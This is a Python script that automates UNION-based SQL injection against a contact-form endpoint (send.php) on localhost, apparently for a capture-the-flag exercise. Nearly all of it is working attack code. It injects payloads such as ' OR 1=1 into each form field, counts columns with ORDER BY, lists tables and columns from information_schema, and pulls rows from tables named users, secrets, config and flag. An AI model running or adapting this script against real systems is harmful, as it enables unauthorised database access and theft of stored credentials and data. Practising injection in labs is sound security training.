import requests
import urllib.parse
import time
import re

# Target configuration
base_url = "http://127.0.0.1:32826"
target_endpoint = "/send.php"
target_url = base_url + target_endpoint

# Parameters to test
parameters = ["fullname", "email", "phone", "subject", "message"]

# Session to handle cookies/redirects
session = requests.Session()
session.redirects = True  # Allow redirects but capture them

def send_payload(param_name, payload, follow_redirects=False):
    """Send payload to specific parameter"""
    data = {
        "fullname": "test",
        "email": "test@example.com", 
        "phone": "1234567890",
        "subject": "test",
        "message": "test"
    }
    data[param_name] = payload
    
    try:
        response = session.post(target_url, data=data, allow_redirects=follow_redirects)
        return {
            'status_code': response.status_code,
            'body': response.text,
            'headers': dict(response.headers),
            'url': response.url,
            'time': response.elapsed.total_seconds()
        }
    except Exception as e:
        return {'error': str(e)}

def test_vulnerable_param():
    """Test which parameter is vulnerable"""
    print("=" * 80)
    print("[1] Testing each parameter for SQL injection vulnerability")
    print("=" * 80)
    
    test_payload = "' OR 1=1 -- "
    
    results = {}
    for param in parameters:
        print(f"\n[*] Testing parameter: {param}")
        print(f"[*] Payload: {test_payload}")
        
        result = send_payload(param, test_payload)
        
        if 'error' in result:
            print(f"[!] Error: {result['error']}")
            results[param] = 'error'
        else:
            print(f"[*] Status Code: {result['status_code']}")
            print(f"[*] Response Length: {len(result['body'])}B")
            print(f"[*] Response Time: {result['time']:.2f}s")
            
            if result['status_code'] == 302:
                print("[+] Got 302 redirect - monitoring for error-based detection")
                
            # Check for SQL error messages
            sql_errors = ['mysql', 'sql', 'sqlite', 'postgresql', 'mssql', 'oracle', 'syntax', 'syntax error', 
                         'unclosed quotation', 'quoted string not properly terminated', 'database error']
            
            has_error = any(error.lower() in result['body'].lower() for error in sql_errors)
            if has_error:
                print(f"[+] SQL error detected - parameter '{param}' may be vulnerable!")
                results[param] = 'vulnerable_with_error'
            else:
                print(f"[-] No obvious SQL errors detected")
                results[param] = 'no_error'
        
        print("-" * 40)
    
    return results

def determine_columns(param):
    """Determine number of columns using ORDER BY technique"""
    print("\n" + "=" * 80)
    print(f"[2] Determining column count for parameter: {param}")
    print("=" * 80)
    
    max_columns = 20
    last_success = 0
    
    for i in range(1, max_columns + 1):
        print(f"[*] Testing ORDER BY {i}...")
        
        # ORDER BY test
        order_payload = f"test' ORDER BY {i}-- "
        result = send_payload(param, order_payload)
        
        if 'error' not in result:
            if result['status_code'] == 302 and 'error' not in result['body'].lower():
                print(f"[+] ORDER BY {i} succeeded")
                last_success = i
            else:
                print(f"[-] ORDER BY {i} failed") 
                break
        else:
            print(f"[-] ORDER BY {i} error: {result['error']}")
            break
    
    print(f"[+] Determined column count: {last_success}")
    return last_success

def test_union_injection(param, column_count):
    """Test UNION-based injection with determined column count"""
    print("\n" + "=" * 80)
    print(f"[3] Testing UNION injection with {column_count} columns")
    print("=" * 80)
    
    # Create UNION payload with NULLs
    union_payload = f"test' UNION SELECT "
    nulls = ["NULL"] * column_count
    union_payload += ", ".join(nulls) + "-- "
    
    print(f"[*] Payload: {union_payload}")
    result = send_payload(param, union_payload, follow_redirects=True)
    
    if 'error' not in result:
        print(f"[+] UNION injection working!")
        print(f"[*] Status Code: {result['status_code']}")
        print(f"[*] Response Length: {len(result['body'])}B")
        print(f"[*] Time: {result['time']:.2f}s")
        
        # Check if response changed
        if len(result['body']) > 100:
            print(f"[+] Response body: {result['body'][:500]}")
            return result
    else:
        print(f"[!] UNION injection failed: {result['error']}")
        return None

def extract_tables(param, column_count):
    """Extract table names from information_schema.tables"""
    print("\n" + "=" * 80)
    print("[4] Extracting table names from information_schema.tables")
    print("=" * 80)
    
    tables_query = "SELECT GROUP_CONCAT(table_name SEPARATOR ', ') FROM information_schema.tables WHERE table_schema = DATABASE()"
    
    # Build union query
    if column_count == 1:
        union_payload = f"test' UNION SELECT ({tables_query})-- "
    elif column_count == 2:
        union_payload = f"test' UNION SELECT NULL, ({tables_query})-- "
    elif column_count == 3:
        union_payload = f"test' UNION SELECT NULL, NULL, ({tables_query})-- "
    elif column_count == 4:
        union_payload = f"test' UNION SELECT NULL, NULL, NULL, ({tables_query})-- "
    elif column_count == 5:
        union_payload = f"test' UNION SELECT NULL, NULL, NULL, NULL, ({tables_query})-- "
    else:
        # Just put query in last column
        union_payload = f"test' UNION SELECT " + ", ".join(["NULL"] * (column_count - 1)) + f", ({tables_query})-- "
    
    print(f"[*] Payload: {union_payload}")
    result = send_payload(param, union_payload, follow_redirects=True)
    
    if 'error' not in result:
        print(f"[+] Table extraction complete")
        print(f"[*] Status Code: {result['status_code']}")
        print(f"[*] Response Length: {len(result['body'])}B")
        print(f"\n[=== TABLE NAMES ===]")
        print(result['body'])
        
        # Extract table names for column enumeration
        return result['body']
    else:
        print(f"[!] Table extraction failed: {result['error']}")
        return None

def extract_columns_from_table(param, column_count, table_name):
    """Extract column names from specific table"""
    print("\n" + "=" * 80)
    print(f"[5] Extracting column names from table: {table_name}")
    print("=" * 80)
    
    columns_query = f"SELECT GROUP_CONCAT(column_name SEPARATOR ', ') FROM information_schema.columns WHERE table_name = '{table_name}'"
    
    if column_count == 1:
        union_payload = f"test' UNION SELECT ({columns_query})-- "
    elif column_count == 2:
        union_payload = f"test' UNION SELECT NULL, ({columns_query})-- "
    elif column_count == 3:
        union_payload = f"test' UNION SELECT NULL, NULL, ({columns_query})-- "
    elif column_count == 4:
        union_payload = f"test' UNION SELECT NULL, NULL, NULL, ({columns_query})-- "
    elif column_count == 5:
        union_payload = f"test' UNION SELECT NULL, NULL, NULL, NULL, ({columns_query})-- "
    else:
        union_payload = f"test' UNION SELECT " + ", ".join(["NULL"] * (column_count - 1)) + f", ({columns_query})-- "
    
    print(f"[*] Payload: {union_payload}")
    result = send_payload(param, union_payload, follow_redirects=True)
    
    if 'error' not in result:
        print(f"[+] Column names extraction complete") 
        print(f"[*] Status Code: {result['status_code']}")
        print(f"[*] Response Length: {len(result['body'])}B")
        print(f"\n[=== COLUMNS IN {table_name} ===]")
        print(result['body'])
        return result['body']
    else:
        print(f"[!] Column extraction failed: {result['error']}")
        return None

def extract_suspicious_data(param, column_count):
    """Extract data from potentially sensitive tables"""
    print("\n" + "=" * 80)
    print("[6] Searching for flag-related data")
    print("=" * 80)
    
    # Try to extract from common tables
    common_tables = ['flag', 'flags', 'users', 'config', 'settings', 'secret', 'secrets']
    
    for table in common_tables:
        print(f"\n[*] Attempting to extract data from: {table}")
        
        # First try SELECT * 
        if column_count == 1:
            data_payload = f"test' UNION SELECT * FROM {table} LIMIT 5-- "
        elif column_count == 2:
            data_payload = f"test' UNION SELECT column1, column2 FROM {table} LIMIT 5-- "
        else:
            # Generic approach
            data_payload = f"test' UNION SELECT 1, 2, 3, 4, 5 FROM {table} LIMIT 5-- "
        
        result = send_payload(param, data_payload, follow_redirects=True)
        
        if 'error' not in result and len(result['body']) > 100:
            print(f"[+] Data extracted from {table}:")
            print(result['body'])
            
            # Check for flag patterns
            if 'flag' in result['body'].lower() or 'FLAG{' in result['body']:
                print(f"[!] FLAG FOUND IN TABLE {table}!")
                return result['body']

def main():
    print("=" * 80)
    print("UNION-BASED SQL INJECTION ENUMERATION FOR send.php")
    print("=" * 80)
    print(f"Target: {target_url}")
    print(f"Parameters to test: {', '.join(parameters)}")
    print("=" * 80)
    
    # Step 1: Find vulnerable parameter
    vuln_results = test_vulnerable_param()
    
    # Find the vulnerable parameter
    vulnerable_param = None
    for param, status in vuln_results.items():
        if status == 'vulnerable_with_error':
            vulnerable_param = param
            break
    
    if not vulnerable_param:
        # If no obvious errors, try the first parameter showing any anomalous behavior
        for param, status in vuln_results.items():
            if status != 'error':
                vulnerable_param = param
                print(f"[!] No clear vulnerability detected, trying parameter: {param}")
                break
    
    if not vulnerable_param:
        print("[!] No viable parameters found for testing")
        return
    
    print(f"\n[+] Targeting parameter: {vulnerable_param}")
    
    # Step 2: Determine column count
    column_count = determine_columns(vulnerable_param)
    
    if column_count < 1:
        print("[!] Could not determine column count")
        return
    
    # Step 3: Test UNION injection
    union_result = test_union_injection(vulnerable_param, column_count)
    
    if union_result:
        # Step 4: Extract table names
        tables_result = extract_tables(vulnerable_param, column_count)
        
        if tables_result:
            # Parse tables (basic parsing)
            table_list = []
            if ',' in tables_result:
                table_list = [t.strip() for t in tables_result.split(',')[:10]]
            else:
                # Try to extract from response body
                matches = re.findall(r'\b(\w+)\b', tables_result)
                table_list = [m for m in matches if len(m) > 2]
            
            # Look for interesting tables first
            for table in ['flag', 'flags', 'user', 'admin', 'secret', 'secrets', 'config']:
                if table in table_list or table.upper() in [t.upper() for t in table_list]:
                    print(f"\n[!] Found interesting table: {table}")
                    extract_columns_from_table(vulnerable_param, column_count, table)
            
            # Step 6: Extract suspicious data
            flag_data = extract_suspicious_data(vulnerable_param, column_count)
            if flag_data:
                print("\n" + "=" * 80)
                print("[!] FLAG DATA SUCCESSFULLY EXTRACTED!")
                print("=" * 80)
                print(flag_data)
    
    # Summary
    print("\n" + "=" * 80)
    print("[SUMMARY]")
    print(f"Target Parameter: {vulnerable_param}")
    print(f"Column Count: {column_count}")
    print(f"Vulnerability Status: {'CONFIRMED' if union_result else 'INCONCLUSIVE'}")
    print("=" * 80)

if __name__ == "__main__":
    main()
    print("\n[+] SQL Injection enumeration script execution complete.")
    print("Check output above for any extracted table/column names and potential flags.")
